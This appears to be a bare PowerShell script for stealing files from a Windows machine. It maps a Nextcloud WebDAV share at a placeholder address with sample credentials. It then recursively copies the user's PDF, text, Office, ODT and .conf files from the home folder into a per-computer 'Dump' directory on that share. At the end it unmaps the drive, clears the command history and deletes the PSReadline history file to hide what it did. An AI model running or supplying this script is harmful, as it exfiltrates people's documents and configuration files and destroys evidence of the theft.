net use * https://<votre instance nextcloud>/nextcloud/remote.php/webdav/ /user:bob /password:alice
mkdir z:\Dump\$env:ComputerName; Get-Childitem $home\ -recurse -filter "*.pdf" | %{Copy-Item -Path $_.FullName -Destination z:\Dump\$env:ComputerName\ }
mkdir z:\Dump\$env:ComputerName; Get-Childitem $home\ -recurse -filter "*.txt" | %{Copy-Item -Path $_.FullName -Destination z:\Dump\$env:ComputerName\ }
mkdir z:\Dump\$env:ComputerName; Get-Childitem $home\ -recurse -filter "*.pptx" | %{Copy-Item -Path $_.FullName -Destination z:\Dump\$env:ComputerName\ }
mkdir z:\Dump\$env:ComputerName; Get-Childitem $home\ -recurse -filter "*.odt" | %{Copy-Item -Path $_.FullName -Destination z:\Dump\$env:ComputerName\ }
mkdir z:\Dump\$env:ComputerName; Get-Childitem $home\ -recurse -filter "*.xls" | %{Copy-Item -Path $_.FullName -Destination z:\Dump\$env:ComputerName\ }
mkdir z:\Dump\$env:ComputerName; Get-Childitem $home\ -recurse -filter "*.docx" | %{Copy-Item -Path $_.FullName -Destination z:\Dump\$env:ComputerName\ }
mkdir z:\Dump\$env:ComputerName; Get-Childitem $home\ -recurse -filter "*.conf" | %{Copy-Item -Path $_.FullName -Destination z:\Dump\$env:ComputerName\ }
net use Z: /delete /yes
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
